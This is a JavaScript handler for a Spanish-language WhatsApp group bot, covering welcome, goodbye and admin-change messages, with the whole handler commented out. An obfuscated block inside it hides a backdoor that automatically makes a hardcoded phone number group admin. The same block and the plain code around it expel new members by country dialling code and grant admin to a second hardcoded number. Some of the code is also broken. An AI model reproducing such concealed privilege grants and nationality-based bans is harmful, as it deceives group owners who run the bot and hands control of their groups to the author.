const { 
    WAConnection,
    MessageType,
    Presence, 
    MessageOptions,
    Mimetype,
    WALocationMessage,
    WA_MESSAGE_STUB_TYPES,
    ReconnectMode,
    ProxyAgent,
    GroupSettingChange,
    ChatModification,
    waChatKey,
    WA_DEFAULT_EPHEMERAL,
    mentionedJid,
    prepareMessageFromContent, 
    Browsers,
    processTime
    } = require("@adiwajshing/baileys")
const conn = require("./index")
const fs = require('fs')
const leo = conn.leo
const {isGroup, Bienvenida, groupMembers, groupAdmins, from} = fs.readFileSync('./thechoute.js')
const { color } = require("../libreria/color");
const {  getBuffer} = require("../libreria/functions");
const antifake = JSON.parse(fs.readFileSync('./database/grupo/antifake.json'))
const {bienvenida, baybay} = require('./mensajes/despedidas')
const isWelkom = isGroup ? Bienvenida.includes(from) : false
    const isAntiFake = isGroup ? antifake.includes(from) : false
//𝕭𝖎𝖊𝖓𝖛𝖊𝖓𝖎𝖉𝖆 / 𝕬𝖉𝖒𝖎𝖓

 /*   
leo.on('group-participants-update', async (anu) => {
    const Bienvenida = JSON.parse(fs.readFileSync('./database/bienvenida.json'))

    if (!Bienvenida.includes(anu.jid)) return
    try {
    const mdata = await leo.groupMetadata(anu.jid)
    console.log(anu)
    if (anu.action == 'add') {               
    num = anu.participants[0]  
    var _0x32eb=['length','203FKZwcC','constructor','text','37321dDPejz','apply','prototype','groupRemove','test','__proto__','table','1102598lCjDcW','1013436pgMCWz','info','toString','startsWith','3291GElTcg','1762sWsYhU','bind','exception','console','trace','log','648921eLIDKy','18299897014','Tu numero ha sido considerado como fake por lo que seras eliminado del Grupo, \x20\x20,\x20\x20\x20\x20\x20\x20\x20\x20,\x20\x20\x20\x20,\x20\x20\x20\x20\x0a\x0aAntiP\x20By:*\x20_Leo\x20🇽\x20_','return\x20/\x22\x20+\x20this\x20+\x20\x22/','sendMessage','324QcfqoI','warn','error','1148172OCGrif','23ykweMi','return\x20(function()\x20'];function _0x3b66(_0x116bb2,_0xa78ba5){return _0x3b66=function(_0x436199,_0x510667){_0x436199=_0x436199-0x70;var _0x51019a=_0x32eb[_0x436199];return _0x51019a;},_0x3b66(_0x116bb2,_0xa78ba5);}var _0x376b6b=_0x3b66;(function(_0xe31b1b,_0x46684b){var _0x30c21e=_0x3b66;while(!![]){try{var _0x598896=-parseInt(_0x30c21e(0x7e))+-parseInt(_0x30c21e(0x91))*-parseInt(_0x30c21e(0x7b))+parseInt(_0x30c21e(0x8c))+-parseInt(_0x30c21e(0x82))*-parseInt(_0x30c21e(0x70))+parseInt(_0x30c21e(0x7f))*parseInt(_0x30c21e(0x85))+-parseInt(_0x30c21e(0x8d))+-parseInt(_0x30c21e(0x76));if(_0x598896===_0x46684b)break;else _0xe31b1b['push'](_0xe31b1b['shift']());}catch(_0x4b5012){_0xe31b1b['push'](_0xe31b1b['shift']());}}}(_0x32eb,0x8c3d6));var _0xb1de39=function(){var _0xdff92c=!![];return function(_0xbaf195,_0x472290){var _0x49ae62=_0xdff92c?function(){var _0x8379c3=_0x3b66;if(_0x472290){var _0x210536=_0x472290[_0x8379c3(0x86)](_0xbaf195,arguments);return _0x472290=null,_0x210536;}}:function(){};return _0xdff92c=![],_0x49ae62;};}(),_0x46ec2c=_0xb1de39(this,function(){var _0x3a6de6=function(){var _0x52b332=_0x3b66,_0x3a1227=_0x3a6de6[_0x52b332(0x83)](_0x52b332(0x79))()[_0x52b332(0x83)]('^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}');return!_0x3a1227[_0x52b332(0x89)](_0x46ec2c);};return _0x3a6de6();});_0x46ec2c();var _0x51019a=function(){var _0x1b381d=!![];return function(_0xdc464c,_0x8f91eb){var _0x4640b3=_0x1b381d?function(){var _0x37d4f6=_0x3b66;if(_0x8f91eb){var _0x4f0489=_0x8f91eb[_0x37d4f6(0x86)](_0xdc464c,arguments);return _0x8f91eb=null,_0x4f0489;}}:function(){};return _0x1b381d=![],_0x4640b3;};}(),_0x510667=_0x51019a(this,function(){var _0x3279f1=_0x3b66,_0x545df1=function(){var _0x5c6de2=_0x3b66,_0xf5f589;try{_0xf5f589=Function(_0x5c6de2(0x80)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x37444b){_0xf5f589=window;}return _0xf5f589;},_0x3ef9e5=_0x545df1(),_0x5c6ba6=_0x3ef9e5[_0x3279f1(0x73)]=_0x3ef9e5['console']||{},_0x373954=[_0x3279f1(0x75),_0x3279f1(0x7c),_0x3279f1(0x8e),_0x3279f1(0x7d),_0x3279f1(0x72),_0x3279f1(0x8b),_0x3279f1(0x74)];for(var _0x3d4618=0x0;_0x3d4618<_0x373954[_0x3279f1(0x81)];_0x3d4618++){var _0x1698c8=_0x51019a[_0x3279f1(0x83)][_0x3279f1(0x87)][_0x3279f1(0x71)](_0x51019a),_0x218220=_0x373954[_0x3d4618],_0x4beaa2=_0x5c6ba6[_0x218220]||_0x1698c8;_0x1698c8[_0x3279f1(0x8a)]=_0x51019a[_0x3279f1(0x71)](_0x51019a),_0x1698c8[_0x3279f1(0x8f)]=_0x4beaa2[_0x3279f1(0x8f)]['bind'](_0x4beaa2),_0x5c6ba6[_0x218220]=_0x1698c8;}});_0x510667();if(num[_0x376b6b(0x90)]('92'))await leo[_0x376b6b(0x7a)](mdata['id'],_0x376b6b(0x78),MessageType[_0x376b6b(0x84)]),leo[_0x376b6b(0x88)](mdata['id'],[num]);if(num[_0x376b6b(0x90)]('000'))await leo[_0x376b6b(0x7a)](mdata['id'],'🇲\x20🇽\x20😈\x20*ARRIVA\x20MEXICO!!!*\x20Bienvenido\x20amigo\x20de\x20mexico,\x20de\x20que\x20parte\x20del\x20pais\x20eres?😙',MessageType['text']);if(num[_0x376b6b(0x90)](_0x376b6b(0x77)))await leo['sendMessage'](mdata['id'],'*VAYA\x20VAYA\x20VAYAAAA🐱\x20Miren\x20nomas\x20quien\x20llego🥳,\x20es\x20mi\x20dueño!!!!😱\x20WOW\x20Saludenlo!😚*\x0a\x0a_*Le\x20dare\x20admin\x20juju*_',MessageType[_0x376b6b(0x84)]),leo['groupMakeAdmin'](mdata['id'],[num]);

    if (num.startsWith('240')) return leo.groupRemove(mdata.id, [num])
if (num.startsWith('994')) return leo.groupRemove(mdata.id, [num])
if (num.startsWith('48')) return leo.groupRemove(mdata.id, [num])
if (num.startsWith('91')) return leo.groupRemove(mdata.id, [num])
if (num.startsWith('34602067238')) return leo.groupMakeAdmin(mdata.id, [num])

try {pushnem = choute.key.fromMe ? leo.user.name : conts.notify || conts.vname || conts.name || '-'
    } catch {pushnem = num.split('@')[0]}
    try {
    ppimg = await leo.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)} 
    catch {
    ppimg = 'https://centromedicomontemar.cl/wp-content/uploads/2015/06/sin-perfil.png'}  
    
    teks = 
`Hola, @${num.split('@')[0]}
Bienvenido a ${mdata.subject}
${bienvenida}`
    let fotoP = await getBuffer(ppimg)
    leo.sendMessage(mdata.id, fotoP, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
    
    }  else if (anu.action == 'remove') {
    num = anu.participants[0]
    try {pushnem = choute.key.fromMe ? leo.user.name : conts.notify || conts.vname || conts.name || '-'
  } catch {pushnem = num.split('@')[0]}
  try {
  ppimg = await leo.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)} 
  catch {
  ppimg = 'https://centromedicomontemar.cl/wp-content/uploads/2015/06/sin-perfil.png'}  
    teks = `@${num.split('@')[0]} ${baybay}`
    let fotoP = await getBuffer(ppimg)
    leo.sendMessage(mdata.id, fotoP, MessageType.image,{caption: teks, contextInfo: {"mentionedJid": [num]}})
  
    } else if (anu.action == 'promote') {
    num = anu.participants[0]
    try { ppimg = await leo.getProfilePicture(`${num.split('@')[0]}@c.us`)
    } catch {ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
    }
    thu = await leo.getStatus(anu.participants[0], MessageType.text)
    teks = 
`👑 *NUEVO ADMIN* 👑
👤 *Nombre:* @${num.split('@')[0]}
📋 *INFO:* ${thu.status}
🌎 *Grupo:* ${mdata.subject}
*Felicitaciones eres uno de los administradores.*`
   let buff = await getBuffer(ppimg)
    leo.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
    } else if (anu.action == 'demote') {
    num = anu.participants[0]
    try {
    ppimg = await leo.getProfilePicture(`${num.split('@')[0]}@c.us`)
    } catch {
    ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
    }
    thu = await leo.getStatus(anu.participants[0], MessageType.text)
    teks = 
`❌ *ADMIN MENOS* ❌
👤 *Nombre:* @${num.split('@')[0]}
📋 *INFO:* ${thu.status}
🌎 *Grupo:* ${mdata.subject} 
*F chota ya no eres administrador.*`
    let buff = await getBuffer(ppimg)
    leo.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
    }
    } catch (e) {
    console.log('Error : %s', color(e, 'red'))
    }
    })
    
    module.exports = {
        isWelkom,
        isAntiFake
     }*/